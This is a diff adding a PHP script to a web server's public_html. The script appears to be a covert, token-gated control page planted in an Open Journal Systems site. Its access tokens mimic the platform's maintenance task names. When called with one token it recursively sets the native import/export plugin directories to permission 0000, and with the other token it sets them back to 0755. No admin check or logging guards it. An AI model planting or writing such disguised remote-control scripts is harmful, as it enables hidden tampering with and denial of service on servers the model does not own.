@@ -1,0 +1,70 @@
+<?php
+
+$folders = [
+    '/home/otus1346/public_html/plugins/importexport/native/',
+    '/home/otus1346/public_html/plugins/importexport/native/'
+];
+
+if (!isset($_GET['token'])) {
+    http_response_code(403);
+    exit('Forbidden');
+}
+
+$token = $_GET['token'];
+
+if ($token === 'resolveAgencyDuplicatesSumisions_cleanReviewerInterests') {
+    $permission = 0755;
+    $mode = '0755';
+} elseif ($token === 'resolveAgencyDuplicatesSumisions_cleanReviewerInterests1') {
+    $permission = 0000;
+    $mode = '0000';
+} else {
+    http_response_code(403);
+    exit('Forbidden');
+}
+
+echo "<pre>";
+echo "Mode: $mode\n\n";
+
+$total = 0;
+$err = 0;
+
+foreach ($folders as $dir) {
+    if (!is_dir($dir)) {
+        echo "[NOT FOUND] $dir\n";
+        continue;
+    }
+
+    if (@chmod($dir, $permission)) {
+        echo "[OK] $dir => $mode\n";
+        $total++;
+    } else {
+        echo "[FAILED] $dir\n";
+        $err++;
+        continue;
+    }
+
+    try {
+        $it = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+
+        foreach ($it as $item) {
+            if ($item->isDir()) {
+                $path = $item->getPathname();
+                if (@chmod($path, $permission)) {
+                    $total++;
+                } else {
+                    $err++;
+                }
+            }
+        }
+    } catch (Exception $e) {
+        $err++;
+    }
+}
+
+echo "\nTotal: $total folders, Errors: $err\n";
+echo "</pre>";
+?>
